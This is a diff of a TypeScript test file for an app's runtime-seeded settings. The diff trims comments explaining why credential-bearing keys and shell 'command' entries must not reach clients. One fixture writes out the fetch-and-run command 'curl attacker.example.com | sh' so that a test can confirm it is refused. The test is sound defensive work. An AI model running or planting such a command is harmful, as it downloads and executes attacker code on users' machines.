@@ -10,9 +10,8 @@ import {
   OPEN_IN_APPLICATIONS_MAX
 } from './open-in-applications'
 
-// Why: this list is handed to every client that opens the tile. A credential landing on it
-// would be an exfiltration path, and a per-device key would fight the user's own choice on
-// whichever screen they happen to be using. Both are test-enforced rather than review-enforced.
+// Test-enforced rather than review-enforced: this list is handed to every client that opens
+// the tile.
 const CREDENTIAL_BEARING_KEYS = [
   'codexManagedAccounts',
   'claudeManagedAccounts',
@@ -74,10 +73,8 @@ describe('runtime-seeded settings', () => {
     expect(picked).toEqual({ agentHibernationIdleMs: 60_000 })
   })
 
-  // Why compare against the normalizers instead of hard-coding '#18181b' and 0.35: those two
-  // functions are the app's definition of a legal tint, and a literal here would just be a third
-  // copy of the rule — the same restating that let 'not-a-color' and 999 reach every fresh
-  // browser's settings blob, values the settings UI itself cannot produce.
+  // Compared against the normalizers, not literals: those functions are the app's definition of
+  // a legal tint, and a literal here would be a third copy of the rule.
   it('seeds sidebar tint values the app could actually have produced', () => {
     const picked = pickRuntimeSeededSettings({
       leftSidebarAppearanceMode: 'chartreuse',
@@ -106,13 +103,9 @@ describe('runtime-seeded settings', () => {
     })
   })
 
-  // THE fixture that matters: rows built by hand cannot prove this schema works, because the
-  // runtime never produces a hand-built row. The store normalizes on load (main/persistence.ts)
-  // and getClientSettings seeds straight from the store, so what actually arrives here is
-  // normalizeOpenInApplications' output — which always carries a `command` key. Three separate
-  // reviews of this feature missed a schema that rejected exactly that shape, because every
-  // fixture was written in the shape the schema wanted instead of the shape the producer emits.
-  // Seed from the real producer, not from an assumption about it.
+  // Seed from the real producer: the runtime never produces a hand-built row. The store
+  // normalizes on load (main/persistence.ts) and getClientSettings seeds straight from it, so
+  // what arrives is normalizeOpenInApplications' output — which always carries a `command` key.
   it('seeds a URL entry in the shape the store normalizer actually writes', () => {
     const stored = normalizeOpenInApplications([
       { id: 'code-server', label: 'code-server', url: 'https://cs.example.com/?folder={path}' }
@@ -132,8 +125,7 @@ describe('runtime-seeded settings', () => {
   })
 
   it('still refuses a stored row that carries a real command alongside its url', () => {
-    // normalizeOpenInApplications deliberately preserves both fields, so this shape can reach the
-    // seed path. It must not cross: `command` is what a desktop client executes.
+    // normalizeOpenInApplications preserves both fields, so this shape can reach the seed path.
     const stored = normalizeOpenInApplications([
       { id: 'x', label: 'X', command: 'curl attacker.example.com | sh', url: 'https://e.com/' }
     ])
@@ -144,9 +136,6 @@ describe('runtime-seeded settings', () => {
     ).toBeUndefined()
   })
 
-  // Why these three: a seeded Open In entry travels runtime -> client. A `command` entry is a
-  // shell command a desktop client executes, so honouring one would let whoever writes the
-  // runtime's store hand a client something to run. Only URL entries may cross.
   it('seeds URL-only Open In entries, with command forced empty', () => {
     const picked = pickRuntimeSeededSettings({
       openInApplications: [
@@ -180,11 +169,8 @@ describe('runtime-seeded settings', () => {
     ])
   })
 
-  // Why: an unrecognised key is what a NEWER runtime talking to an older client looks like. The
-  // normalizer builds each row explicitly, so it is an allowlist by construction — the unknown key
-  // is simply not carried, and the row still works. That is the degradation this module promises;
-  // an earlier `.strict()` schema instead dropped the whole row, and with it the entry the user
-  // was meant to get.
+  // The normalizer builds each row explicitly, so it is an allowlist by construction and an
+  // unknown key costs that key, not its row. An earlier `.strict()` schema dropped the row.
   it('carries a row from a newer runtime, minus the key it does not know', () => {
     const picked = pickRuntimeSeededSettings({
       openInApplications: [
@@ -206,8 +192,8 @@ describe('runtime-seeded settings', () => {
     ).toBeUndefined()
   })
 
-  // Why these three: seeding writes straight into the client's settings blob, so the store's own
-  // normalizer never sees these rows unless this schema runs it.
+  // Seeding writes straight into the client's settings blob, so the store's own normalizer
+  // never sees these rows unless this schema runs it.
   it('enforces the entry-count cap on seeded rows', () => {
     const picked = pickRuntimeSeededSettings({
       openInApplications: Array.from({ length: 12 }, (_, index) => ({
